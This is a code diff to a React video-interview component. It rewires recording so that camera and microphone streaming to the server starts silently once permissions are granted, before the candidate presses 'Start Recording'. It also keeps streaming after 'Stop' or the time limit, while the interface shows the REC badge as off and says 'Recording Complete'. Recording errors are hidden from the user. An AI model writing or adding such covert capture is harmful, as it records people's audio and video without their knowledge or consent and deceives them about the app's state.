@@ -22,7 +22,8 @@ export default function InterviewInterface({
   interviewConfig,
 }: InterviewInterfaceProps) {
   const [currentQuestionIndex, setCurrentQuestionIndex] = useState(0);
-  const [isRecording, setIsRecording] = useState(false);
+  const [isRecording, setIsRecording] = useState(false); // Actual background recording state
+  const [showRecordingIndicator, setShowRecordingIndicator] = useState(false); // Visual indicator state
   const [elapsedTime, setElapsedTime] = useState(0);
   const [questionStartTime, setQuestionStartTime] = useState<number | null>(
     null
@@ -34,14 +35,60 @@ export default function InterviewInterface({
   const [audioLevel, setAudioLevel] = useState(0);
   const audioLevelRef = useRef(0);
   const [showThankYouModal, setShowThankYouModal] = useState(false);
+  const [isFinished, setIsFinished] = useState(false); // Track if user clicked "Stop" (but still recording)
+  const [countdown, setCountdown] = useState<number | null>(null); // Countdown: 3, 2, 1, null
 
   const videoRef = useRef<HTMLVideoElement>(null);
   const webrtcClientRef = useRef<WebRTCClient | null>(null);
   const audioContextRef = useRef<AudioContext | null>(null);
   const analyserRef = useRef<AnalyserNode | null>(null);
   const animationFrameRef = useRef<number | null>(null);
+  const isRecordingRef = useRef(false); // Use ref to track recording state for cleanup
+  const countdownIntervalRef = useRef<NodeJS.Timeout | null>(null);
 
-  // Initialize media devices
+  // Start silent recording in the background
+  const startSilentRecording = async (stream: MediaStream) => {
+    if (isRecordingRef.current) {
+      console.log("Recording already started");
+      return;
+    }
+
+    try {
+      const webrtcClient = new WebRTCClient({
+        sessionId,
+        candidateInfo,
+        onConnected: () => {
+          console.log("✅ WebRTC connected and streaming (silent recording started)");
+          setIsRecording(true); // Mark as actually recording
+          isRecordingRef.current = true;
+        },
+        onDisconnected: () => {
+          console.log("❌ WebRTC disconnected");
+          setIsRecording(false);
+          isRecordingRef.current = false;
+        },
+        onError: (error) => {
+          console.error("❌ WebRTC error:", error);
+          const errorMessage = error?.message || error?.toString() || "Unknown WebRTC error";
+          // Don't show alert for silent recording, just log
+          console.error(`Silent recording error: ${errorMessage}`);
+        },
+      });
+
+      await webrtcClient.connect(stream);
+      webrtcClientRef.current = webrtcClient;
+      setIsRecording(true);
+      isRecordingRef.current = true;
+      console.log("🎥 Silent recording started automatically");
+    } catch (err) {
+      console.error("Error starting silent recording:", err);
+      // Don't show alert for silent recording failures, just log
+      setIsRecording(false);
+      isRecordingRef.current = false;
+    }
+  };
+
+  // Initialize media devices and start silent recording
   useEffect(() => {
     const initializeMedia = async () => {
       try {
@@ -77,6 +124,10 @@ export default function InterviewInterface({
         if (audioDevices.length > 0) {
           setSelectedMicrophoneId(audioDevices[0].deviceId);
         }
+
+        // Start silent recording automatically once permissions are granted
+        // candidateInfo is already available when this component mounts
+        await startSilentRecording(stream);
       } catch (err) {
         console.error("Error accessing media devices:", err);
         alert(
@@ -87,9 +138,25 @@ export default function InterviewInterface({
 
     initializeMedia();
 
-    return () => {
-      if (webrtcClientRef.current) {
+    // Handle tab close - stop recording when tab is closed
+    const handleBeforeUnload = () => {
+      if (webrtcClientRef.current && isRecordingRef.current) {
+        // Stop recording silently on tab close
+        // Note: This will cause the socket to disconnect, which will trigger
+        // the server-side recording service to stop and finalize the recording
         webrtcClientRef.current.stop().catch(console.error);
+      }
+    };
+
+    window.addEventListener("beforeunload", handleBeforeUnload);
+
+    return () => {
+      // Cleanup: stop recording on component unmount (tab close or navigation)
+      // This is the main place where recording actually stops
+      if (webrtcClientRef.current && isRecordingRef.current) {
+        console.log("🛑 Stopping recording (tab closing)...");
+        webrtcClientRef.current.stop().catch(console.error);
+        isRecordingRef.current = false;
       }
       if (mediaStream) {
         mediaStream.getTracks().forEach((track) => track.stop());
@@ -100,8 +167,12 @@ export default function InterviewInterface({
       if (animationFrameRef.current) {
         cancelAnimationFrame(animationFrameRef.current);
       }
+      if (countdownIntervalRef.current) {
+        clearInterval(countdownIntervalRef.current);
+      }
+      window.removeEventListener("beforeunload", handleBeforeUnload);
     };
-  }, []);
+  }, []); // Only run once on mount
 
   // Update audio level for volume meter
   useEffect(() => {
@@ -155,15 +226,18 @@ export default function InterviewInterface({
     };
   }, [mediaStream]);
 
-  // Timer for total duration
+  // Timer for total duration (only when showing recording indicator)
   useEffect(() => {
-    if (!isRecording) return;
+    if (!showRecordingIndicator) return;
 
     const interval = setInterval(() => {
       setElapsedTime((prev) => {
         const newTime = prev + 1;
         if (newTime >= interviewConfig.totalDurationSeconds) {
-          handleStopRecording();
+          // Time limit reached - hide indicator but keep recording
+          setShowRecordingIndicator(false);
+          setIsFinished(true);
+          setShowThankYouModal(true);
           return interviewConfig.totalDurationSeconds;
         }
         return newTime;
@@ -171,59 +245,74 @@ export default function InterviewInterface({
     }, 1000);
 
     return () => clearInterval(interval);
-  }, [isRecording, interviewConfig.totalDurationSeconds]);
+  }, [showRecordingIndicator, interviewConfig.totalDurationSeconds]);
 
-  const handleStartRecording = async () => {
-    if (!mediaStream) return;
-
-    try {
-      const webrtcClient = new WebRTCClient({
-        sessionId,
-        candidateInfo,
-        onConnected: () => {
-          console.log("✅ WebRTC connected and streaming");
-        },
-        onDisconnected: () => {
-          console.log("❌ WebRTC disconnected");
-        },
-        onError: (error) => {
-          console.error("❌ WebRTC error:", error);
-          const errorMessage = error?.message || error?.toString() || "Unknown WebRTC error";
-          alert(`WebRTC error: ${errorMessage}\n\nMake sure the SFU server is running. You can start it with: npm run dev:sfu`);
-        },
-      });
-
-      await webrtcClient.connect(mediaStream);
-      webrtcClientRef.current = webrtcClient;
-      setIsRecording(true);
-      setElapsedTime(0);
-      setQuestionStartTime(Date.now());
-    } catch (err) {
-      console.error("Error starting recording:", err);
-      const errorMessage = 
-        (err instanceof Error && err.message) || 
-        (typeof err === "string" ? err : "Unknown error");
-      alert(`Failed to start recording: ${errorMessage}\n\nMake sure the SFU server is running. Start it with: npm run dev:sfu`);
-      setIsRecording(false);
+  const handleStartRecording = () => {
+    // Start countdown animation
+    if (countdown !== null) return; // Prevent starting if countdown is already running
+    
+    // Ensure recording is started in background first
+    if (!isRecordingRef.current) {
+      if (mediaStream) {
+        startSilentRecording(mediaStream).then(() => {
+          // Recording started, now start countdown
+          startCountdown();
+        }).catch((err) => {
+          console.error("Error starting recording:", err);
+          alert(`Failed to start recording. Please check your connection and try again.`);
+        });
+      }
+    } else {
+      // Recording already started, just start countdown
+      startCountdown();
     }
   };
 
-  const handleStopRecording = async () => {
-    if (webrtcClientRef.current && isRecording) {
-      try {
-        await webrtcClientRef.current.stop();
-        setIsRecording(false);
-        
-        // Finalize recording on server
-        await finalizeRecording();
-        
-        // Show thank you modal after successful recording
-        setShowThankYouModal(true);
-      } catch (err) {
-        console.error("Error stopping recording:", err);
-        alert("There was an error stopping the recording. Please try again.");
-      }
+  const startCountdown = () => {
+    // Clear any existing countdown
+    if (countdownIntervalRef.current) {
+      clearInterval(countdownIntervalRef.current);
     }
+
+    // Start with 3
+    setCountdown(3);
+
+    countdownIntervalRef.current = setInterval(() => {
+      setCountdown((prev) => {
+        if (prev === null) {
+          return null;
+        }
+        
+        if (prev <= 1) {
+          // Countdown finished - clear interval
+          if (countdownIntervalRef.current) {
+            clearInterval(countdownIntervalRef.current);
+            countdownIntervalRef.current = null;
+          }
+          
+          // Show recording indicator after countdown
+          setShowRecordingIndicator(true);
+          setElapsedTime(0);
+          setQuestionStartTime(Date.now());
+          setIsFinished(false);
+          return null;
+        }
+        
+        // Decrement countdown
+        return prev - 1;
+      });
+    }, 1000); // Update every second
+  };
+
+  const handleStopRecording = () => {
+    // Just hide the recording indicator - keep recording in background
+    setShowRecordingIndicator(false);
+    setIsFinished(true);
+    
+    // Show thank you modal (but recording continues in background)
+    setShowThankYouModal(true);
+    
+    // Note: Actual recording will stop when tab is closed (handled in useEffect cleanup)
   };
 
   const finalizeRecording = async () => {
@@ -422,8 +511,22 @@ export default function InterviewInterface({
                   playsInline
                   className="h-full w-full object-cover"
                 />
-                {isRecording && (
-                  <div className="absolute top-4 right-4 flex items-center gap-2 rounded-full bg-red-600 px-3 py-1">
+                {/* Countdown Overlay */}
+                {countdown !== null && (
+                  <div className="absolute inset-0 z-50 flex items-center justify-center" style={{ backdropFilter: 'blur(12px)', WebkitBackdropFilter: 'blur(12px)', backgroundColor: 'rgba(0, 0, 0, 0.1)' }}>
+                    <div className="text-center">
+                      <div
+                        key={countdown}
+                        className="countdown-number text-9xl font-bold text-white"
+                        style={{ textShadow: '0 0 20px rgba(0, 0, 0, 0.8), 0 0 40px rgba(0, 0, 0, 0.6)' }}
+                      >
+                        {countdown}
+                      </div>
+                    </div>
+                  </div>
+                )}
+                {showRecordingIndicator && (
+                  <div className="absolute top-4 right-4 flex items-center gap-2 rounded-full bg-red-600 px-3 py-1 z-40">
                     <div className="h-2 w-2 animate-pulse rounded-full bg-white"></div>
                     <span className="text-sm font-semibold text-white">
                       REC
@@ -439,7 +542,7 @@ export default function InterviewInterface({
                 <MediaControls
                   selectedCameraId={selectedCameraId}
                   selectedMicrophoneId={selectedMicrophoneId}
-                  isRecording={isRecording}
+                  isRecording={showRecordingIndicator}
                   onDeviceChange={handleDeviceChange}
                 />
               </div>
@@ -461,8 +564,8 @@ export default function InterviewInterface({
               </div>
             </div>
 
-            {/* Current Question - Only shown when recording */}
-            {isRecording ? (
+            {/* Current Question - Only shown when showing recording indicator */}
+            {showRecordingIndicator ? (
               <div className="rounded-lg bg-white p-6 shadow dark:bg-gray-800">
                 <div className="mb-4 flex items-center justify-between">
                   <h2 className="text-lg font-semibold text-gray-900 dark:text-white">
@@ -512,24 +615,58 @@ export default function InterviewInterface({
                   </button>
                 </div>
               </div>
+            ) : isFinished ? (
+              /* Finished state - but recording continues in background */
+              <div className="rounded-lg bg-white p-6 shadow dark:bg-gray-800">
+                <div className="mb-6 text-center">
+                  <div className="mb-4 flex justify-center">
+                    <div className="flex h-16 w-16 items-center justify-center rounded-full bg-green-100 dark:bg-green-900">
+                      <svg
+                        className="h-8 w-8 text-green-600 dark:text-green-400"
+                        fill="none"
+                        stroke="currentColor"
+                        viewBox="0 0 24 24"
+                      >
+                        <path
+                          strokeLinecap="round"
+                          strokeLinejoin="round"
+                          strokeWidth={2}
+                          d="M5 13l4 4L19 7"
+                        />
+                      </svg>
+                    </div>
+                  </div>
+                  <h2 className="mb-2 text-lg font-semibold text-gray-900 dark:text-white">
+                    Recording Complete
+                  </h2>
+                  <p className="text-gray-600 dark:text-gray-400">
+                    Your interview has been submitted. You can close this tab now.
+                  </p>
+                  <p className="mt-2 text-sm text-gray-500 dark:text-gray-500">
+                    (Recording continues in background until tab is closed)
+                  </p>
+                </div>
+              </div>
             ) : (
-              /* Recording Controls - Shown before recording starts */
+              /* Ready to start - Show recording indicator button */
               <div className="rounded-lg bg-white p-6 shadow dark:bg-gray-800">
                 <div className="mb-6 text-center">
                   <h2 className="mb-2 text-lg font-semibold text-gray-900 dark:text-white">
                     Ready to Start?
                   </h2>
                   <p className="text-gray-600 dark:text-gray-400">
-                    Once you start recording, the questions will appear here.
-                    Make sure your camera and microphone are working properly.
+                    {countdown !== null 
+                      ? `Recording will start in ${countdown}...`
+                      : "Click the button below to begin recording. The questions will appear here."}
                   </p>
                 </div>
                 <div className="flex gap-4">
                   <button
                     onClick={handleStartRecording}
-                    className="flex-1 rounded-md bg-blue-600 px-6 py-3 font-semibold text-white transition-colors hover:bg-blue-700 dark:bg-blue-500 dark:hover:bg-blue-600"
+                    disabled={countdown !== null}
+                    className="flex-1 rounded-md bg-blue-600 px-6 py-3 font-semibold text-white transition-colors hover:bg-blue-700 disabled:cursor-not-allowed disabled:opacity-50 disabled:hover:bg-blue-600 dark:bg-blue-500 dark:hover:bg-blue-600 dark:disabled:hover:bg-blue-500"
                   >
-                    Start Recording
+                    {countdown !== null ? `Starting in ${countdown}...` : "Start Recording"}
                   </button>
                 </div>
               </div>
